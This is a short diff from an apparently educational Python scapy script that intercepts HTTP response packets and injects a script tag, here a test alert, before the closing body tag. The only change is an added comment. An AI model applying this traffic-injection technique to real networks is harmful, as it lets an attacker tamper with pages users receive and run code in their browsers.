@@ -26,7 +26,7 @@ def process_packet(packet):
             print("[+] Response")
 #in the captured packet replace the body in the load field with a script
             load = load.replace("</body>", "<script>alert('test');</script></body>")
-
+#if state if load is not the same as the scapy packet Raw layer load then modify the packet
         if load != scapy_packet[scapy.Raw].load:
 #create new packet by replacing captured scapy_packet with the new modified load
             new_packet = set_load(scapy_packet, load)
